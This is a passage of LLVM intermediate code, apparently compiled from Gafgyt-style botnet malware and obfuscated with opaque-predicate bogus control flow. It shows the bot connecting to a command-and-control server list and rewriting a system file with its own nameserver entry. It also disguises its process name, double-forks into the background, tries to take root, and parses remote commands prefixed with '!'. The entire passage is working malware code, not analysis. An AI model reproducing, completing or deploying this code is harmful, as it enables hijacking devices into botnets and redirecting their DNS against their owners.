  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart210, label %originalBB1alteredBB

originalBBpart210:                                ; preds = %originalBB1
  br label %51

; <label>:51:                                     ; preds = %originalBBpart210, %31
  %52 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %53 = load i32, i32* @currentServer, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  %57 = call i8* @strcpy(i8* %52, i8* %56) #5
  store i32 23, i32* %3, align 4
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %59 = call i8* @strchr(i8* %58, i32 58) #9
  %60 = icmp ne i8* %59, null
  br i1 %60, label %61, label %68

; <label>:61:                                     ; preds = %51
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %63 = call i8* @strchr(i8* %62, i32 58) #9
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = call i32 @atoi(i8* %64) #9
  store i32 %65, i32* %3, align 4
  %66 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %67 = call i8* @strchr(i8* %66, i32 58) #9
  store i8 0, i8* %67, align 1
  br label %68

; <label>:68:                                     ; preds = %61, %51
  %69 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %69, i32* @mainCommSock, align 4
  %70 = load i32, i32* @mainCommSock, align 4
  %71 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %72 = load i32, i32* %3, align 4
  %73 = call i32 @connectTimeout(i32 %70, i8* %71, i32 %72, i32 30)
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %76, label %75

; <label>:75:                                     ; preds = %68
  store i32 1, i32* %1, align 4
  br label %77

; <label>:76:                                     ; preds = %68
  store i32 0, i32* %1, align 4
  br label %77

; <label>:77:                                     ; preds = %76, %75
  %78 = load i32, i32* @x.77
  %79 = load i32, i32* @y.78
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %77
  %86 = load i32, i32* %1, align 4
  %87 = load i32, i32* @x.77
  %88 = load i32, i32* @y.78
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %7
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 @close(i32 %95)
  store i32 0, i32* @mainCommSock, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %97 = load i32, i32* @currentServer, align 4
  %_ = sub i32 %97, 1
  %gen = mul i32 %_, 1
  %_2 = sub i32 %97, 1
  %gen3 = mul i32 %_2, 1
  %_4 = shl i32 %97, 1
  %_5 = sub i32 %97, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 %97, 1
  %gen8 = mul i32 %_7, 1
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* @currentServer, align 4
  br label %originalBB1

originalBB12alteredBB:                            ; preds = %originalBB12, %77
  %99 = load i32, i32* %1, align 4
  br label %originalBB12
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.121, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.121, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %32

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* @x.79
  %10 = load i32, i32* @y.80
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.122, i32 0, i32 0), i8** %2, align 8
  %17 = load i8*, i8** %2, align 8
  %18 = call i64 @strlen(i8* %17) #9
  store i64 %18, i64* %3, align 8
  %19 = load i16, i16* %1, align 2
  %20 = zext i16 %19 to i32
  %21 = load i8*, i8** %2, align 8
  %22 = load i64, i64* %3, align 8
  %23 = call i64 @write(i32 %20, i8* %21, i64 %22)
  %24 = load i32, i32* @x.79
  %25 = load i32, i32* @y.80
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:32:                                     ; preds = %0
  br label %37

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i16, i16* %1, align 2
  %35 = zext i16 %34 to i32
  %36 = call i32 @close(i32 %35)
  br label %37

; <label>:37:                                     ; preds = %33, %32
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %8
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.122, i32 0, i32 0), i8** %2, align 8
  %38 = load i8*, i8** %2, align 8
  %39 = call i64 @strlen(i8* %38) #9
  store i64 %39, i64* %3, align 8
  %40 = load i16, i16* %1, align 2
  %41 = zext i16 %40 to i32
  %42 = load i8*, i8** %2, align 8
  %43 = load i64, i64* %3, align 8
  %44 = call i64 @write(i32 %41, i8* %42, i64 %43)
  br label %originalBB
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %7, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %51

; <label>:48:                                     ; preds = %2
  %49 = load i32, i32* %7, align 4
  %50 = call i32 @waitpid(i32 %49, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:51:                                     ; preds = %2
  %52 = load i32, i32* @x.81
  %53 = load i32, i32* @y.82
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %51
  %60 = load i32, i32* %7, align 4
  %61 = icmp ne i32 %60, 0
  %62 = load i32, i32* @x.81
  %63 = load i32, i32* @y.82
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %61, label %97, label %70

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = call i32 @fork() #5
  store i32 %71, i32* %8, align 4
  %72 = icmp ne i32 %71, 0
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %70
  call void @exit(i32 0) #12
  unreachable

; <label>:74:                                     ; preds = %70
  %75 = load i32, i32* %8, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %94, label %77

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* @x.81
  %79 = load i32, i32* @y.82
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %77
  %86 = load i32, i32* @x.81
  %87 = load i32, i32* @y.82
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %95

; <label>:94:                                     ; preds = %74
  br label %95

; <label>:95:                                     ; preds = %94, %originalBBpart24
  br label %96

; <label>:96:                                     ; preds = %95
  br label %114

; <label>:97:                                     ; preds = %originalBBpart2
  %98 = load i32, i32* @x.81
  %99 = load i32, i32* @y.82
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %97
  %106 = load i32, i32* @x.81
  %107 = load i32, i32* @y.82
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %114

; <label>:114:                                    ; preds = %originalBBpart28, %96
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0)) #5
  %117 = call i32 @setuid(i32 0) #5
  %118 = call i32 @seteuid(i32 0) #5
  %119 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %120

; <label>:120:                                    ; preds = %126, %115
  %121 = call i32 @fork() #5
  %122 = icmp eq i32 %121, 0
  br i1 %122, label %123, label %533

; <label>:123:                                    ; preds = %120
  %124 = call i32 @initConnection()
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %126, label %128

; <label>:126:                                    ; preds = %123
  %127 = call i32 @sleep(i32 5)
  br label %120

; <label>:128:                                    ; preds = %123
  %129 = load i32, i32* @mainCommSock, align 4
  %130 = call i8* @getBuild()
  %131 = call i32 @getEndianness()
  %132 = call i32 (i32, i8*, ...) @sockprintf(i32 %129, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.130, i32 0, i32 0), i8* %130, i32 %131)
  call void @UpdateNameSrvs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %133

; <label>:133:                                    ; preds = %531, %322, %270, %128
  %134 = load i32, i32* @mainCommSock, align 4
  %135 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %136 = call i32 @recvLine(i32 %134, i8* %135, i32 4096)
  store i32 %136, i32* %11, align 4
  %137 = icmp ne i32 %136, -1
  br i1 %137, label %138, label %532

; <label>:138:                                    ; preds = %133
  store i32 0, i32* %12, align 4
  br label %139

; <label>:139:                                    ; preds = %258, %138
  %140 = load i32, i32* @x.81
  %141 = load i32, i32* @y.82
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %139
  %148 = load i32, i32* %12, align 4
  %149 = sext i32 %148 to i64
  %150 = load i64, i64* @numpids, align 8
  %151 = icmp ult i64 %149, %150
  %152 = load i32, i32* @x.81
  %153 = load i32, i32* @y.82
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %151, label %160, label %261

; <label>:160:                                    ; preds = %originalBBpart212
  %161 = load i32, i32* @x.81
  %162 = load i32, i32* @y.82
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %160
  %169 = load i32*, i32** @pids, align 8
  %170 = load i32, i32* %12, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds i32, i32* %169, i64 %171
  %173 = load i32, i32* %172, align 4
  %174 = call i32 @waitpid(i32 %173, i32* null, i32 1)
  %175 = icmp sgt i32 %174, 0
  %176 = load i32, i32* @x.81
  %177 = load i32, i32* @y.82
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %175, label %184, label %257

; <label>:184:                                    ; preds = %originalBBpart216
  %185 = load i32, i32* %12, align 4
  %186 = add nsw i32 %185, 1
  store i32 %186, i32* %14, align 4
  br label %187

; <label>:187:                                    ; preds = %219, %184
  %188 = load i32, i32* %14, align 4
  %189 = zext i32 %188 to i64
  %190 = load i64, i64* @numpids, align 8
  %191 = icmp ult i64 %189, %190
  br i1 %191, label %192, label %222

; <label>:192:                                    ; preds = %187
  %193 = load i32, i32* @x.81
  %194 = load i32, i32* @y.82
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %192
  %201 = load i32*, i32** @pids, align 8
  %202 = load i32, i32* %14, align 4
  %203 = zext i32 %202 to i64
  %204 = getelementptr inbounds i32, i32* %201, i64 %203
  %205 = load i32, i32* %204, align 4
  %206 = load i32*, i32** @pids, align 8
  %207 = load i32, i32* %14, align 4
  %208 = sub i32 %207, 1
  %209 = zext i32 %208 to i64
  %210 = getelementptr inbounds i32, i32* %206, i64 %209
  store i32 %205, i32* %210, align 4
  %211 = load i32, i32* @x.81
  %212 = load i32, i32* @y.82
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart231, label %originalBB18alteredBB

originalBBpart231:                                ; preds = %originalBB18
  br label %219

; <label>:219:                                    ; preds = %originalBBpart231
  %220 = load i32, i32* %14, align 4
  %221 = add i32 %220, 1
  store i32 %221, i32* %14, align 4
  br label %187

; <label>:222:                                    ; preds = %187
  %223 = load i32*, i32** @pids, align 8
  %224 = load i32, i32* %14, align 4
  %225 = sub i32 %224, 1
  %226 = zext i32 %225 to i64
  %227 = getelementptr inbounds i32, i32* %223, i64 %226
  store i32 0, i32* %227, align 4
  %228 = load i64, i64* @numpids, align 8
  %229 = add i64 %228, -1
  store i64 %229, i64* @numpids, align 8
  %230 = load i64, i64* @numpids, align 8
  %231 = add i64 %230, 1
  %232 = mul i64 %231, 4
  %233 = call noalias i8* @malloc(i64 %232) #5
  %234 = bitcast i8* %233 to i32*
  store i32* %234, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %235

; <label>:235:                                    ; preds = %250, %222
  %236 = load i32, i32* %14, align 4
  %237 = zext i32 %236 to i64
  %238 = load i64, i64* @numpids, align 8
  %239 = icmp ult i64 %237, %238
  br i1 %239, label %240, label %253

; <label>:240:                                    ; preds = %235
  %241 = load i32*, i32** @pids, align 8
  %242 = load i32, i32* %14, align 4
  %243 = zext i32 %242 to i64
  %244 = getelementptr inbounds i32, i32* %241, i64 %243
  %245 = load i32, i32* %244, align 4
  %246 = load i32*, i32** %13, align 8
  %247 = load i32, i32* %14, align 4
  %248 = zext i32 %247 to i64
  %249 = getelementptr inbounds i32, i32* %246, i64 %248
  store i32 %245, i32* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %240
  %251 = load i32, i32* %14, align 4
  %252 = add i32 %251, 1
  store i32 %252, i32* %14, align 4
  br label %235

; <label>:253:                                    ; preds = %235
  %254 = load i32*, i32** @pids, align 8
  %255 = bitcast i32* %254 to i8*
  call void @free(i8* %255) #5
  %256 = load i32*, i32** %13, align 8
  store i32* %256, i32** @pids, align 8
  br label %257

; <label>:257:                                    ; preds = %253, %originalBBpart216
  br label %258

; <label>:258:                                    ; preds = %257
  %259 = load i32, i32* %12, align 4
  %260 = add nsw i32 %259, 1
  store i32 %260, i32* %12, align 4
  br label %139

; <label>:261:                                    ; preds = %originalBBpart212
  %262 = load i32, i32* %11, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %263
  store i8 0, i8* %264, align 1
  %265 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %265)
  %266 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %267 = call i8* @strstr(i8* %266, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0)) #9
  %268 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %269 = icmp eq i8* %267, %268
  br i1 %269, label %270, label %271

; <label>:270:                                    ; preds = %261
  br label %133

; <label>:271:                                    ; preds = %261
  %272 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %273 = call i8* @strstr(i8* %272, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.131, i32 0, i32 0)) #9
  %274 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %275 = icmp eq i8* %273, %274
  br i1 %275, label %276, label %277

; <label>:276:                                    ; preds = %271
  call void @exit(i32 0) #12
  unreachable

; <label>:277:                                    ; preds = %271
  %278 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %278, i8** %15, align 8
  %279 = load i8*, i8** %15, align 8
  %280 = load i8, i8* %279, align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 33
  br i1 %282, label %283, label %531

; <label>:283:                                    ; preds = %277
  %284 = load i8*, i8** %15, align 8
  %285 = getelementptr inbounds i8, i8* %284, i64 1
  store i8* %285, i8** %16, align 8
  br label %286

; <label>:286:                                    ; preds = %314, %283
  %287 = load i8*, i8** %16, align 8
  %288 = load i8, i8* %287, align 1
  %289 = zext i8 %288 to i32
  %290 = icmp ne i32 %289, 32
  br i1 %290, label %291, label %312

; <label>:291:                                    ; preds = %286
  %292 = load i32, i32* @x.81
  %293 = load i32, i32* @y.82
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %291
  %300 = load i8*, i8** %16, align 8
  %301 = load i8, i8* %300, align 1
  %302 = zext i8 %301 to i32
  %303 = icmp ne i32 %302, 0
  %304 = load i32, i32* @x.81
  %305 = load i32, i32* @y.82
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %312

; <label>:312:                                    ; preds = %originalBBpart235, %286
  %313 = phi i1 [ false, %286 ], [ %303, %originalBBpart235 ]
  br i1 %313, label %314, label %317

; <label>:314:                                    ; preds = %312
  %315 = load i8*, i8** %16, align 8
  %316 = getelementptr inbounds i8, i8* %315, i32 1
  store i8* %316, i8** %16, align 8
  br label %286

; <label>:317:                                    ; preds = %312
  %318 = load i8*, i8** %16, align 8
  %319 = load i8, i8* %318, align 1
  %320 = zext i8 %319 to i32
  %321 = icmp eq i32 %320, 0
  br i1 %321, label %322, label %323

; <label>:322:                                    ; preds = %317
  br label %133

; <label>:323:                                    ; preds = %317
  %324 = load i8*, i8** %16, align 8
  store i8 0, i8* %324, align 1
  %325 = load i8*, i8** %15, align 8
  %326 = getelementptr inbounds i8, i8* %325, i64 1
  store i8* %326, i8** %16, align 8
  %327 = load i8*, i8** %15, align 8
  %328 = load i8*, i8** %16, align 8
  %329 = call i64 @strlen(i8* %328) #9
  %330 = getelementptr inbounds i8, i8* %327, i64 %329
  %331 = getelementptr inbounds i8, i8* %330, i64 2
  store i8* %331, i8** %15, align 8
  br label %332

; <label>:332:                                    ; preds = %originalBBpart247, %323
  %333 = load i8*, i8** %15, align 8
  %334 = load i8*, i8** %15, align 8
  %335 = call i64 @strlen(i8* %334) #9
  %336 = sub i64 %335, 1
  %337 = getelementptr inbounds i8, i8* %333, i64 %336
  %338 = load i8, i8* %337, align 1
  %339 = zext i8 %338 to i32
  %340 = icmp eq i32 %339, 10
  br i1 %340, label %350, label %341

; <label>:341:                                    ; preds = %332
  %342 = load i8*, i8** %15, align 8
  %343 = load i8*, i8** %15, align 8
  %344 = call i64 @strlen(i8* %343) #9
  %345 = sub i64 %344, 1
  %346 = getelementptr inbounds i8, i8* %342, i64 %345
  %347 = load i8, i8* %346, align 1
  %348 = zext i8 %347 to i32
  %349 = icmp eq i32 %348, 13
  br label %350

; <label>:350:                                    ; preds = %341, %332
  %351 = phi i1 [ true, %332 ], [ %349, %341 ]
  %352 = load i32, i32* @x.81
  %353 = load i32, i32* @y.82
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %350
  %360 = load i32, i32* @x.81
  %361 = load i32, i32* @y.82
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %351, label %368, label %390

; <label>:368:                                    ; preds = %originalBBpart239
  %369 = load i32, i32* @x.81
  %370 = load i32, i32* @y.82
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %368
  %377 = load i8*, i8** %15, align 8
  %378 = load i8*, i8** %15, align 8
  %379 = call i64 @strlen(i8* %378) #9
  %380 = sub i64 %379, 1
  %381 = getelementptr inbounds i8, i8* %377, i64 %380
  store i8 0, i8* %381, align 1
  %382 = load i32, i32* @x.81
  %383 = load i32, i32* @y.82
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBBpart247, label %originalBB41alteredBB

originalBBpart247:                                ; preds = %originalBB41
  br label %332

; <label>:390:                                    ; preds = %originalBBpart239
  %391 = load i8*, i8** %15, align 8
  store i8* %391, i8** %17, align 8
  br label %392

; <label>:392:                                    ; preds = %404, %390
  %393 = load i8*, i8** %15, align 8
  %394 = load i8, i8* %393, align 1
  %395 = zext i8 %394 to i32
  %396 = icmp ne i32 %395, 32
  br i1 %396, label %397, label %402

; <label>:397:                                    ; preds = %392
  %398 = load i8*, i8** %15, align 8
  %399 = load i8, i8* %398, align 1
  %400 = zext i8 %399 to i32
  %401 = icmp ne i32 %400, 0
  br label %402

; <label>:402:                                    ; preds = %397, %392
  %403 = phi i1 [ false, %392 ], [ %401, %397 ]
  br i1 %403, label %404, label %407

; <label>:404:                                    ; preds = %402
  %405 = load i8*, i8** %15, align 8
  %406 = getelementptr inbounds i8, i8* %405, i32 1
  store i8* %406, i8** %15, align 8
  br label %392

; <label>:407:                                    ; preds = %402
  %408 = load i8*, i8** %15, align 8
  store i8 0, i8* %408, align 1
  %409 = load i8*, i8** %15, align 8
  %410 = getelementptr inbounds i8, i8* %409, i32 1
  store i8* %410, i8** %15, align 8
  %411 = load i8*, i8** %17, align 8
  store i8* %411, i8** %18, align 8
  br label %412

; <label>:412:                                    ; preds = %416, %407
  %413 = load i8*, i8** %18, align 8
  %414 = load i8, i8* %413, align 1
  %415 = icmp ne i8 %414, 0
  br i1 %415, label %416, label %425

; <label>:416:                                    ; preds = %412
  %417 = load i8*, i8** %18, align 8
  %418 = load i8, i8* %417, align 1
  %419 = zext i8 %418 to i32
  %420 = call i32 @toupper(i32 %419) #9
  %421 = trunc i32 %420 to i8
  %422 = load i8*, i8** %18, align 8
  store i8 %421, i8* %422, align 1
  %423 = load i8*, i8** %18, align 8
  %424 = getelementptr inbounds i8, i8* %423, i32 1
  store i8* %424, i8** %18, align 8
  br label %412

; <label>:425:                                    ; preds = %412
  store i32 1, i32* %20, align 4
  %426 = load i8*, i8** %15, align 8
  %427 = call i8* @strtok(i8* %426, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0)) #5
  store i8* %427, i8** %21, align 8
  %428 = load i8*, i8** %17, align 8
  %429 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %428, i8** %429, align 16
  br label %430

; <label>:430:                                    ; preds = %originalBBpart251, %425
  %431 = load i8*, i8** %21, align 8
  %432 = icmp ne i8* %431, null
  br i1 %432, label %433, label %479

; <label>:433:                                    ; preds = %430
  %434 = load i8*, i8** %21, align 8
  %435 = load i8, i8* %434, align 1
  %436 = zext i8 %435 to i32
  %437 = icmp ne i32 %436, 10
  br i1 %437, label %438, label %461

; <label>:438:                                    ; preds = %433
  %439 = load i8*, i8** %21, align 8
  %440 = call i64 @strlen(i8* %439) #9
  %441 = add i64 %440, 1
  %442 = call noalias i8* @malloc(i64 %441) #5
  %443 = load i32, i32* %20, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %444
  store i8* %442, i8** %445, align 8
  %446 = load i32, i32* %20, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %447
